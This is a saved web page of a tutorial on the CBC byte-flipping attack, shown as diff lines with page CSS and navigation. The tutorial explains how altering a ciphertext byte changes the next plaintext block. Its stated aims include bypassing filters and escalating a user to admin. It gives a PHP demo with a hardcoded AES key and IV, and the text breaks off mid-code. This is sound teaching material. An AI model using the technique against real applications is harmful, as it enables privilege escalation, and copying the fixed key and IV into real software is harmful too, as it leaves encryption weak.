+	text-decoration: none !important;
+    font: normal 15px 'Lucida Grande', 'Lucida Sans Unicode', Lucida, Arial, Helvetica, sans-serif !important;
+}
+
+
+.ll-content-notification {
+    vertical-align: baseline !important;
+    color: #000 !important;
+    overflow: visible !important;
+    visibility: visible !important;
+    margin: 0 !important;
+    padding: 0 !important;
+    position: fixed !important;
+    background: #fff !important;
+    border: solid 1px #AAA !important;
+	/*
+    left: -999px;
+    top: -999px;
+	*/
+    width: auto;
+    /* width: 300px !important; */
+    display: block;
+    z-index: 999999999 !important;
+    -webkit-box-shadow: 0 2px 4px rgba(0, 0, 0, 0.18) !important;
+    -moz-box-shadow: 0 2px 4px rgba(0, 0, 0, 0.18) !important;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.18) !important;
+    -webkit-border-radius: 3px !important;
+    -moz-border-radius: 3px !important;
+    border-radius: 3px !important;
+    overflow: hidden !important;
+    /* opacity: 0 !important; */
+    transition: opacity 0.8s !important;
+    -moz-transition: opacity 0.8s !important; /* Firefox 4 */
+    -webkit-transition: opacity 0.8s !important; /* Safari and Chrome */
+    -o-transition: opacity 0.8s !important; /* Opera */
+    cursor: default !important;
+}
+
+.ll-content-notification-shown {
+    opacity: 1 !important;
+    transition: opacity 0.8s !important;
+    -moz-transition: opacity 0.8s !important; /* Firefox 4 */
+    -webkit-transition: opacity 0.8s !important; /* Safari and Chrome */
+    -o-transition: opacity 0.8s !important; /* Opera */
+}
+
+.ll-content-notification-header {
+	border: 0 !important;
+	margin: 0 !important;
+    background: url(data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAABCAIAAABsYngUAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAadEVYdFNvZnR3YXJlAFBhaW50Lk5FVCB2My41LjEwMPRyoQAAABJJREFUGFdjePHmCxw9e/UZjgAVYhYtk8xZqAAAAABJRU5ErkJggg==) !important;
+    border-bottom: solid 1px #CCC !important;
+    padding: 1px 4px !important;
+	min-height: 18px !important;
+	width: 100% !important;
+	-webkit-border-top-left-radius: 3px !important;
+    -webkit-border-top-right-radius: 3px !important;
+    -moz-border-radius-topleft: 3px !important;
+    -moz-border-radius-topright: 3px !important;
+    border-top-left-radius: 3px !important;
+    border-top-right-radius: 3px !important;
+	border-collapse: collapse !important;
+	border-spacing: 0 !important;
+}
+
+.ll-content-notification-header-pic {
+	border: 0 !important;
+	margin: 0 !important;
+	padding: 3px 0 0 3px !important;
+	width: 20px !important;
+	vertical-align: top !important;
+	line-height: 1px !important;
+}
+
+.ll-content-notification-header-pic img{
+	border: 0 !important;
+	padding: 0 !important;
+	margin: 0 !important;
+	line-height: 1px !important;
+}
+
+
+.ll-content-notification-header-caption {
+    font: normal 13px 'Lucida Grande', 'Lucida Sans Unicode', Lucida, Arial, Helvetica, sans-serif !important;
+	font-weight: bold !important;
+    line-height: 15px !important;
+    color: #555 !important;
+    float: left !important;
+    text-shadow: none !important;
+    letter-spacing: normal !important;
+	white-space: normal !important;
+	padding: 3px !important;
+	margin: 0 !important;
+}
+
+.ll-content-notification-header-close {
+    width: 15px !important;
+	vertical-align: top !important;
+	text-align: right !important;
+	padding: 6px 5px 0 0 !important;
+	margin: 0 !important;
+	line-height: 1px !important;
+}
+
+.ll-content-notification-header-close img {
+	border: 0 !important;
+    width: 7px !important;
+    height: 7px !important;
+    margin: 0 !important;
+	padding: 0 !important;
+}
+
+.ll-content-notification-content {
+    margin: 0 !important;
+    padding: 8px !important;
+    float: left !important;
+    overflow: hidden !important;
+    width: auto !important;
+}
+
+.ll-content-notification-content-logo {
+    float: left !important;
+	height: 48px !important;
+	width: 48px !important;
+}
+
+.ll-content-notification-content-main {
+    margin-left: 60px !important;
+    overflow: hidden !important;
+    padding: 0 0 2px 0 !important;
+    color: #333 !important;
+    text-align: left !important;
+    text-shadow: none !important;
+    letter-spacing: normal !important;
+    font: normal 13px 'Lucida Grande', 'Lucida Sans Unicode', Lucida, Arial, Helvetica, sans-serif !important;
+    line-height: 15px !important;
+    width: auto !important;
+}
+
+.ll-content-notification-content-header {
+	text-align: left !important;
+	text-decoration: none !important;
+    font: bold 15px 'Lucida Grande', 'Lucida Sans Unicode', Lucida, Arial, Helvetica, sans-serif !important;
+    line-height: 19px !important;
+    margin: 0 0 4px 0 !important;
+    padding: 0 !important;
+    border: 0 !important;
+    color: #333 !important;
+    text-shadow: none !important;
+    letter-spacing: normal !important;
+    display: block !important;
+    top: 0 !important;
+    left: 0 !important;
+}
+
+.ll-content-notification-word {
+    color: #d56e00 !important;
+    font-weight: bold !important;
+    font-size: 14px !important;
+}
+</style><script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/analytics"></script><script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/analytics(1)"></script></head>
+<body class="single single-post postid-20700 single-format-standard" data-twttr-rendered="true" style="">
+<div id="wrapper">
+<div class="header-v3">
+	<div class="header-social">
+		<div class="avada-row">
+						<div class="alignleft">
+            	<span class="sep">
+					877.791.9571                </span>
+				<span class="sep">|</span>                								<ul class="social-networks social-networks-light">
+										<li class="facebook"><a target="" href="https://www.facebook.com/infosecedu">Facebook</a>
+						<div class="popup">
+							<div class="holder">
+								<p>Facebook</p>
+							</div>
+						</div>
+					</li>
+															<li class="twitter"><a target="" href="https://twitter.com/infosecedu">Twitter</a>
+						<div class="popup">
+							<div class="holder">
+								<p>Twitter</p>
+							</div>
+						</div>
+					</li>
+															<li class="linkedin"><a target="" href="http://www.linkedin.com/company/infosec-institute">LinkedIn</a>
+						<div class="popup">
+							<div class="holder">
+								<p>LinkedIn</p>
+							</div>
+						</div>
+					</li>
+															<li class="rss"><a target="" href="http://resources.infosecinstitute.com/feed/">RSS</a>
+						<div class="popup">
+							<div class="holder">
+								<p>RSS</p>
+							</div>
+						</div>
+					</li>
+																																																																																									</ul>
+							</div>
+						<div class="alignright">
+            	                			</div>
+		</div>
+	</div>
+	<header id="header">
+		<div class="avada-row" style="margin-top:0;margin-bottom:0;">
+			<div class="logo" style="margin-left:0px;margin-bottom:10px;"><a href="http://resources.infosecinstitute.com/"><img src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/logo.png" alt="InfoSec Institute"></a></div>
+						<nav id="nav-uber">
+							<nav id="megaMenu" class="megaMenuContainer wpmega-preset-trans-black megaResponsive megaResponsiveToggle wpmega-withjs megaMenuOnHover megaMenuHorizontal wpmega-noconflict megaMinimizeResiduals megaMenu-withjs"><div id="megaMenuToggle" class="megaMenuToggle">Menu&nbsp; <span class="megaMenuToggle-icon"></span></div><ul id="megaUber" class="megaMenu"><li id="menu-item-21716" class="wpf_gray menu-item menu-item-type-post_type menu-item-object-page ss-nav-menu-item-0 ss-nav-menu-item-depth-0 ss-nav-menu-mega ss-nav-menu-mega-alignCenter"><a href="http://resources.infosecinstitute.com/"><span class="wpmega-link-title">Home</span></a></li><li id="menu-item-21738" class="wpf_gray menu-item menu-item-type-post_type menu-item-object-page ss-nav-menu-item-1 ss-nav-menu-item-depth-0 ss-nav-menu-mega ss-nav-menu-mega-alignCenter"><a href="http://resources.infosecinstitute.com/contributors/"><span class="wpmega-link-title">Contributors</span></a></li><li id="menu-item-21719" class="wpf_green wpf_hover menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children mega-with-sub ss-nav-menu-item-2 ss-nav-menu-item-depth-0 ss-nav-menu-mega ss-nav-menu-mega-fullWidth ss-nav-menu-mega-alignCenter ss-override"><a href="http://resources.infosecinstitute.com/articles"><span class="wpmega-link-title">Articles</span></a><div class="wpmega-nonlink uberClearfix">If you want to write for InfoSec Resources, contact Rob Rodrigues at rob.rodriguez@infosecinstitute.com.</div>
+<ul class="sub-menu sub-menu-1" style="display: none;">
+<li id="menu-item-22330" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children ss-nav-menu-item-depth-1"><a href="http://resources.infosecinstitute.com/category/certifications-training/"><span class="wpmega-link-title">IT Certifications</span></a>
+	<ul class="sub-menu sub-menu-2">
+<li id="menu-item-22341" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent ss-nav-menu-item-depth-2"><a href="http://resources.infosecinstitute.com/category/hacking-2/"><span class="wpmega-link-title">Hacking</span></a></li><li id="menu-item-22339" class="menu-item menu-item-type-taxonomy menu-item-object-category ss-nav-menu-item-depth-2"><a href="http://resources.infosecinstitute.com/category/application-security-2/"><span class="wpmega-link-title">Application Security</span></a></li><li id="menu-item-22340" class="menu-item menu-item-type-taxonomy menu-item-object-category ss-nav-menu-item-depth-2"><a href="http://resources.infosecinstitute.com/category/forensics-2/"><span class="wpmega-link-title">Forensics</span></a></li><li id="menu-item-22344" class="menu-item menu-item-type-taxonomy menu-item-object-category ss-nav-menu-item-depth-2"><a href="http://resources.infosecinstitute.com/category/general-security-2/"><span class="wpmega-link-title">General Security</span></a></li><li id="menu-item-22346" class="menu-item menu-item-type-taxonomy menu-item-object-category ss-nav-menu-item-depth-2"><a href="http://resources.infosecinstitute.com/category/virtualization-security/"><span class="wpmega-link-title">Virtualization Security</span></a></li><li id="menu-item-22347" class="menu-item menu-item-type-taxonomy menu-item-object-category ss-nav-menu-item-depth-2"><a href="http://resources.infosecinstitute.com/category/wireless-security/"><span class="wpmega-link-title">Wireless Security</span></a></li><li id="menu-item-22519" class="menu-item menu-item-type-taxonomy menu-item-object-category ss-nav-menu-item-depth-2"><a href="http://resources.infosecinstitute.com/category/scada-2/"><span class="wpmega-link-title">SCADA</span></a></li><li id="menu-item-22520" class="menu-item menu-item-type-taxonomy menu-item-object-category ss-nav-menu-item-depth-2"><a href="http://resources.infosecinstitute.com/category/reverse-engineering-2/"><span class="wpmega-link-title">Reverse Engineering</span></a></li>	</ul>
+</li><li id="menu-item-22331" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children ss-nav-menu-item-depth-1"><a href="http://resources.infosecinstitute.com/category/certifications-training/"><span class="wpmega-link-title">IT Certifications</span></a>
+	<ul class="sub-menu sub-menu-2">
+<li id="menu-item-22333" class="menu-item menu-item-type-taxonomy menu-item-object-category ss-nav-menu-item-depth-2"><a href="http://resources.infosecinstitute.com/category/certifications-training/ccna-certification/"><span class="wpmega-link-title">CCNA</span></a></li><li id="menu-item-22334" class="menu-item menu-item-type-taxonomy menu-item-object-category ss-nav-menu-item-depth-2"><a href="http://resources.infosecinstitute.com/category/certifications-training/ceh/"><span class="wpmega-link-title">CEH</span></a></li><li id="menu-item-22335" class="menu-item menu-item-type-taxonomy menu-item-object-category ss-nav-menu-item-depth-2"><a href="http://resources.infosecinstitute.com/category/certifications-training/cisa/"><span class="wpmega-link-title">CISA</span></a></li><li id="menu-item-22336" class="menu-item menu-item-type-taxonomy menu-item-object-category ss-nav-menu-item-depth-2"><a href="http://resources.infosecinstitute.com/category/certifications-training/cism/"><span class="wpmega-link-title">CISM</span></a></li><li id="menu-item-22337" class="menu-item menu-item-type-taxonomy menu-item-object-category ss-nav-menu-item-depth-2"><a href="http://resources.infosecinstitute.com/category/certifications-training/cissp/"><span class="wpmega-link-title">CISSP</span></a></li><li id="menu-item-22338" class="menu-item menu-item-type-taxonomy menu-item-object-category ss-nav-menu-item-depth-2"><a href="http://resources.infosecinstitute.com/category/certifications-training/mcitp/"><span class="wpmega-link-title">MCITP</span></a></li>	</ul>
+</li></ul>
+</li><li id="menu-item-21737" class="wpf_green menu-item menu-item-type-post_type menu-item-object-page ss-nav-menu-item-3 ss-nav-menu-item-depth-0 ss-nav-menu-mega ss-nav-menu-mega-alignCenter"><a href="http://resources.infosecinstitute.com/mini-courses/"><span class="wpmega-link-title">Mini Courses</span></a></li><li id="menu-item-21721" class="wpf_green menu-item menu-item-type-custom menu-item-object-custom ss-nav-menu-item-4 ss-nav-menu-item-depth-0 ss-nav-menu-mega ss-nav-menu-mega-alignCenter"><a href="http://resources.infosecinstitute.com/downloads"><span class="wpmega-link-title">Downloads</span></a></li><li id="menu-item-21722" class="wpf_blue menu-item menu-item-type-custom menu-item-object-custom ss-nav-menu-item-5 ss-nav-menu-item-depth-0 ss-nav-menu-mega ss-nav-menu-mega-alignCenter"><a target="_blank" href="http://www.infosecinstitute.com/courses/security.html"><span class="wpmega-link-title">Courses</span></a></li><li id="menu-item-21723" class="wpf_blue menu-item menu-item-type-custom menu-item-object-custom ss-nav-menu-item-6 ss-nav-menu-item-depth-0 ss-nav-menu-mega ss-nav-menu-mega-alignCenter"><a target="_blank" href="http://www.infosecinstitute.com/request_course_catalog.html"><span class="wpmega-link-title">Schedule</span></a></li><li id="menu-item-21717" class="wpf_blue menu-item menu-item-type-post_type menu-item-object-page ss-nav-menu-item-7 ss-nav-menu-item-depth-0 ss-nav-menu-mega ss-nav-menu-mega-alignCenter"><a target="_blank" href="http://resources.infosecinstitute.com/about/"><span class="wpmega-link-title">About</span></a></li></ul></nav>			</nav>
+		</div>
+	</header>
+</div>
+<script>
+    jQuery(document).ready(function(){
+		var flip = 0;
+		jQuery(".widget_categories .heading").prepend('<span style="position:absolute;"><strong>+</strong></span>');
+		jQuery(".widget_categories .heading").find('h3').css('padding-left','15px');
+		jQuery(".widget_categories").find('ul').hide();
+		jQuery(".widget_categories").on('click', '.heading', function(){
+			jQuery(this).siblings('ul').slideToggle();
+			flip++;
+			if(flip % 2 === 1){
+				jQuery(this).find('span').html('<strong>-</strong>');
+			}else{
+				jQuery(this).find('span').html('<strong>+</strong>');
+			}
+		});
+		/*jQuery(".widget").on('click', '.heading', function(){
+			jQuery(this).siblings('ul').slideToggle();
+			jQuery(this).siblings('ul').hide();
+		});*/
+	});
+	jQuery(document).ready(function(){
+		jQuery('#smart-archives-list').on('click', 'h2', function(e){
+			e.preventDefault();
+			jQuery(this).next('ul').slideToggle();
+		});
+	});
+    </script>
+    <!--<style>
+	#sidebar .widget_categories .children {display:none;}
+	</style>--><div id="sliders-container">
+</div>
+<div id="main" style="overflow:hidden !important;">
+    <div class="avada-row" style="position: relative;">		<section class="reading-box">
+	<div class="box-container">
+		<section class="columns content-boxes columns-3 single_page_columns">
+			<article class="col">
+				<div class="heading">
+				<h2>Download &amp; Resources</h2></div>Sign up for our newsletter to get the
+				 latest updates. 				
+<form accept-charset="UTF-8" method="post" action="http://www2.infosecinstitute.com/l/12882/2013-02-20/5rv4q" name="mailchimpemail" class="news_letter_signup" id="pardot-form" _lpchecked="1">
+					<input type="email" name="12882_105181pi_12882_105181" id="12882_105181pi_12882_105181" onchange="piAjax.auditEmailField(this, 12882, 105181, 3856611);">
+<div id="error_for_12882_105181pi_12882_105181" style="display:none"> </div>					
+<input type="submit" name="mailchimpsubmit" class="button small gray" value="Submit" accesskey="s">
+
+<input type="hidden" name="hiddenDependentFields" id="hiddenDependentFields" value="">
+				</form>
+			</article>
+	<div class="col box">
+	<h2>View our FREE mini-courses!</h2>
+	<div class="text-hold"><a href="http://resources.infosecinstitute.com/mini-courses/"><input type="button" value="SIGN UP NOW " class="button small green"></a>
+	<img src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/home1.jpg" alt="View our FREE mini-courses!" width="250" height="120" class="alignright size-full wp-image-21729">
+</div>
+	</div>
+	<div class="col box blueborder" style="padding-right: 0px;">
+	<div class="text-hold">
+	<img src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/home2.jpg" alt="" class="alignright blue-image"><p></p>
+	<h2 class="blue">Discounted Boot Camps</h2>
+	<a href="http://www.infosecinstitute.com/"><input type="button" value="SIGN UP NOW" class="button small blue"></a>
+	</div>
+	</div>
+	</section>
+	</div>
+	</section>
+
+
+	<div id="content" style="">
+								
+				<div id="post-20700" class="post-20700 post type-post status-publish format-standard hentry category-hacking-2 tag-feature tag-hacking post">
+			<div class="columns-2">
+			<div style="width: 62%; float: left; border-right: #eee solid 1px;">
+				<h2 style="padding-right: 18px;"><a href="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/CBC Byte Flipping Attack—101 Approach - InfoSec Institute.htm">CBC Byte Flipping Attack—101 Approach</a></h2>
+			</div>
+		
+			<div style="width: 37%; float: left; text-align: right;">				
+                <script src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/in.js" type="text/javascript"></script><span class="IN-widget" style="line-height: 1; vertical-align: baseline; display: inline-block; text-align: center;"><span style="padding: 0px !important; margin: 0px !important; text-indent: 0px !important; display: inline-block !important; vertical-align: baseline !important; font-size: 1px !important;"><span id="li_ui_li_gen_1395468358102_1-container" class="IN-top"><span id="li_ui_li_gen_1395468358102_1" class="IN-top"><span id="li_ui_li_gen_1395468358102_1-inner" class="IN-top"><span id="li_ui_li_gen_1395468358102_1-content" class="IN-top">13</span></span></span></span></span><br><span style="padding: 0px !important; margin: 0px !important; text-indent: 0px !important; display: inline-block !important; vertical-align: baseline !important; font-size: 1px !important;"><span id="li_ui_li_gen_1395468358091_0"><a id="li_ui_li_gen_1395468358091_0-link" href="javascript:void(0);"><span id="li_ui_li_gen_1395468358091_0-logo">in</span><span id="li_ui_li_gen_1395468358091_0-title"><span id="li_ui_li_gen_1395468358091_0-mark"></span><span id="li_ui_li_gen_1395468358091_0-title-text">Share</span></span></a></span></span></span><script type="IN/Share+init" data-url="http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/" data-counter="top"></script>                <script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/plusone.js" gapi_processed="true"></script><div id="___plusone_0" style="text-indent: 0px; margin: 0px; padding: 0px; background-color: transparent; border-style: none; float: none; line-height: normal; font-size: 1px; vertical-align: baseline; display: inline-block; width: 50px; height: 60px; background-position: initial initial; background-repeat: initial initial;"><iframe frameborder="0" hspace="0" marginheight="0" marginwidth="0" scrolling="no" style="position: static; top: 0px; width: 50px; margin: 0px; border-style: none; left: 0px; visibility: visible; height: 60px;" tabindex="0" vspace="0" width="100%" id="I0_1395468358814" name="I0_1395468358814" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/fastbutton.htm" data-gapiattached="true" title="+1"></iframe></div>				<iframe id="twitter-widget-0" scrolling="no" frameborder="0" allowtransparency="true" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/tweet_button.1395439856.htm" class="twitter-share-button twitter-tweet-button twitter-count-vertical" title="Twitter Tweet Button" data-twttr-rendered="true" style="width: 59px; height: 62px;"></iframe><script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/widgets.js"></script>                <iframe src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/like.htm" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:50px; height:62px;" allowtransparency="true"></iframe> 
+                            	
+			</div>
+			
+			</div>
+			<div class="clearfix">&nbsp;</div>
+			<div class="clearfix">&nbsp;</div>
+			
+			
+														
+															
+			
+						<div class="post-content">
+				<!--adinj Ad Injection debug mode on--><!--ADINJ DEBUG: picked value at position 0: ad_code_random_1-->
+<!--ADINJ DEBUG: picked value at position 0: ad_code_random_1-->
+<p><span>As usual, there are some explanations about this attack out there (see references at the end), but some knowledge is required to understand it properly, so here I will describe, step by step, how to perform this attack.</span></p>
+<p><span><strong>Purpose of the Attack</strong><span>: To change a byte in the plaintext by corrupting a byte in the ciphertext.<br>
+</span></span></p>
+<p><span><strong>Why?</strong></span></p>
+<p><span>To bypass filters by adding malicious chars like a single quote, or to elevate privileges by changing the ID of the user to admin, or any other consequence of changing the plaintext expected by an application.<br>
+</span></p>
+<p><span><strong>Introduction</strong></span></p>
+<p><span>First of all, let’s start understanding how CBC (cipher-block chaining) works. A detailed explanation can be found here:<br>
+</span></p>
+<p><a href="http://en.wikipedia.org/wiki/Block_cipher_mode_of_operation">http://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher-block_chaining_.28CBC.29</a></p>
+<p><span>But I will only explain what is needed to understand the attack.<br>
+</span></p>
+<p><span><strong>Encryption process</strong></span></p>
+<p><img alt="" class="lazy " src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/082113_1459_CBCByteFlip1.png" data-original="http://resources.infosecinstitute.com/wp-content/uploads/082113_1459_CBCByteFlip1.png" style="display: inline;"><noscript>&lt;img alt="" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/082113_1459_CBCByteFlip1.png" /&gt;</noscript></p>
+<p><span><strong>Plaintext</strong>:<span> The data to be encrypted.<br>
+</span></span></p>
+<p><span><strong>IV</strong><span>: A block of bits that is used to randomize the encryption and hence to produce distinct ciphertexts even if the same plaintext is encrypted multiple times.<br>
+</span></span></p>
+<p><span><strong>Key</strong><span>: Used by symmetric encryption algorithms like AES, Blowfish, DES, Triple DES, etc.<br>
+</span></span></p>
+<p><span><strong>Ciphertext</strong><span>: The data encrypted.<br>
+</span></span></p>
+<p><span>An important point here is that CBC works on a fixed-length group of bits called a block. In this blog, we will use blocks of 16 bytes each.<br>
+</span></p>
+<p><span>Since I hate mathematical formulas, below are mine:<br>
+</span></p>
+<p><span>Ciphertext-0 = Encrypt(Plaintext XOR IV)—Just for the first block.<br>
+</span></p>
+<p><span>Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1)—For second and remaining blocks.<br>
+</span></p>
+<p><span>Note: As you can see, the ciphertext of the previous block is used to generate the next one.<br>
+</span></p>
+<p><span><strong>Decryption Process</strong></span></p>
+<p><img alt="" class="lazy " src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/082113_1459_CBCByteFlip2.png" data-original="http://resources.infosecinstitute.com/wp-content/uploads/082113_1459_CBCByteFlip2.png" style="display: inline;"><noscript>&lt;img alt="" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/082113_1459_CBCByteFlip2.png" /&gt;</noscript></p>
+<p><span>Plaintext-0 = Decrypt(Ciphertext) XOR IV—Just for the first block.<br>
+</span></p>
+<p><span>Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1—For second and remaining blocks.<br>
+</span></p>
+<p><span>Note: The Ciphertext-N-1 is used to generate the plaintext of the next block; this is where the byte flipping attack comes into play. If we change one byte of the Ciphertext-N-1 then, by XORing with the net decrypted block, we will get a different plaintext! You got it? Do not worry, we will see a detailed example below. Meanwhile, below is a nice diagram explaining this attack:<br>
+</span></p>
+<p><img alt="" class="lazy " src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/082113_1459_CBCByteFlip3.jpg" data-original="http://resources.infosecinstitute.com/wp-content/uploads/082113_1459_CBCByteFlip3.jpg" style="display: inline;"><noscript>&lt;img alt="" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/082113_1459_CBCByteFlip3.jpg" /&gt;</noscript></p>
+<p><span><strong>Example: CBC Blocks of 16 bytes</strong></span></p>
+<p><span>Let’s say we have this serialized plaintext:<br>
+</span></p>
+<p><span>a:2:{s:4:”name”;s:<span style="color: red;">6<span>:”sdsdsd”;s:8:”greeting”;s:20:”echo ‘Hello sdsdsd!’”;}<br>
+</span></span></span></p>
+<p><span>Our target is to change the number 6 at “s:<span style="color: red;">6<span>” to number “7″. The first thing we need to do is to split the plaintext into 16-byte chunks:<br>
+</span></span></span></p>
+<p><span>Block 1: a:<span style="color: red;">2<span>:{s:4:”name”;<br>
+</span></span>Block 2 s:<span style="color: red;">6<span>:”sdsdsd”;s:8 &amp;lt;&amp;lt;&lt;—–target data-blogger-escaped-div=”" data-blogger-escaped-here=”"&gt;<br>
+</span></span>Block 3: :”greeting”;s:20:<br>
+Block 4: “echo ‘Hello sd<br>
+Block 5: sdsd!’”;}<br>
+</span></p>
+<p><span>So our target character is located at block 2, which means that we need to change the ciphertext of block 1 to change the plaintext of the second block.<br>
+</span></p>
+<p><span>A rule of thumb is that the byte you change in a ciphertext will ONLY affect a byte at the same offset of next plaintext. Our target is at offset 2:<br>
+</span></p>
+<p><span>[0] = s<br>
+[1] = :<br>
+[2] = <span style="color: red;">6</span></span></p>
+<p><span>Therefore we need to change the byte at offset 2 of the first ciphertext block. As you can see in the code below, at line 2 we get the ciphertext of the whole data, then at line 3 we change the byte of block 1 at offset 2, and finally we call the decryption function.<br>
+</span></p>
+<p><span>1. <span style="color: lime;">$v = “a:2:{s:4:”name”;s:6:”sdsdsd”;s:8:”greeting”;s:20:”echo ‘Hello sdsdsd!’”;}”;<br>
+</span>2. <span style="color: lime;">$enc = @encrypt($v);<br>
+</span>3. <span style="color: lime;">$enc[2] = chr(ord($enc[2]) ^ ord(“6″) ^ ord (“7″));<br>
+</span>4. <span style="color: lime;">$b = @decrypt($enc);</span></span></p>
+<p><span>After running this code, we are able to change number 6 to 7:<br>
+</span></p>
+<p><img alt="" class="lazy " src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/082113_1459_CBCByteFlip4.png" data-original="http://resources.infosecinstitute.com/wp-content/uploads/082113_1459_CBCByteFlip4.png" style="display: inline;"><noscript>&lt;img alt="" src="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/uploads/082113_1459_CBCByteFlip4.png" /&gt;</noscript></p>
+<p><span>But, how did we change the byte to the value we wanted at line 3?</span></p>
+<p><span>Based on the decryption process described above, we know that A = Decrypt(Ciphertext) is XOR with B = Ciphertext-N-1 to finally get C = 6. Which is equal to:<br>
+</span></p>
+<p><span>C = A XOR B<br>
+</span></p>
+<p><span>So the only value we do not know is A (block cipher decryption); with XOR we can easily get that value by doing:<br>
+</span></p>
+<p><span>A = B XOR C<br>
+</span></p>
+<p><span>And finally, A XOR B XOR C is equal to 0. With this formula, we can set our own value by adding it at the end of the XOR calculation, like this:<br>
+</span></p>
+<p><span>A XOR B XOR C XOR “7″ will give us 7 in the plaintext at offset 2 on the second block.<br>
+</span></p>
+<p><span>Below is the PHP source code so that you can replicate it:<br>
+</span></p>
+<div><div id="highlighter_746729" class="syntaxhighlighter  php"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="php plain">define(</code><code class="php string">'MY_AES_KEY'</code><code class="php plain">, </code><code class="php string">"abcdef0123456789"</code><code class="php plain">);</code></div><div class="line number2 index1 alt1"><code class="php keyword">function</code> <code class="php plain">aes(</code><code class="php variable">$data</code><code class="php plain">, </code><code class="php variable">$encrypt</code><code class="php plain">) {</code></div><div class="line number3 index2 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$aes</code> <code class="php plain">= mcrypt_module_open(MCRYPT_RIJNDAEL_128, </code><code class="php string">''</code><code class="php plain">, MCRYPT_MODE_CBC, </code><code class="php string">''</code><code class="php plain">);</code></div><div class="line number4 index3 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$iv</code> <code class="php plain">= </code><code class="php string">"1234567891234567"</code><code class="php plain">;</code></div><div class="line number5 index4 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">mcrypt_generic_init(</code><code class="php variable">$aes</code><code class="php plain">, MY_AES_KEY, </code><code class="php variable">$iv</code><code class="php plain">);</code></div><div class="line number6 index5 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">return</code> <code class="php variable">$encrypt</code> <code class="php plain">? mcrypt_generic(</code><code class="php variable">$aes</code><code class="php plain">,</code><code class="php variable">$data</code><code class="php plain">) : mdecrypt_generic(</code><code class="php variable">$aes</code><code class="php plain">,</code><code class="php variable">$data</code><code class="php plain">);</code></div><div class="line number7 index6 alt2"><code class="php plain">}</code></div><div class="line number8 index7 alt1">&nbsp;</div><div class="line number9 index8 alt2"><code class="php plain">define(</code><code class="php string">'MY_MAC_LEN'</code><code class="php plain">, 40);</code></div><div class="line number10 index9 alt1">&nbsp;</div><div class="line number11 index10 alt2"><code class="php keyword">function</code> <code class="php plain">encrypt(</code><code class="php variable">$data</code><code class="php plain">) {</code></div><div class="line number12 index11 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">return</code> <code class="php plain">aes(</code><code class="php variable">$data</code><code class="php plain">, true);</code></div><div class="line number13 index12 alt2"><code class="php plain">}</code></div><div class="line number14 index13 alt1">&nbsp;</div><div class="line number15 index14 alt2"><code class="php keyword">function</code> <code class="php plain">decrypt(</code><code class="php variable">$data</code><code class="php plain">) {</code></div><div class="line number16 index15 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$data</code> <code class="php plain">= rtrim(aes(</code><code class="php variable">$data</code><code class="php plain">, false), </code><code class="php string">"\0"</code><code class="php plain">);</code></div><div 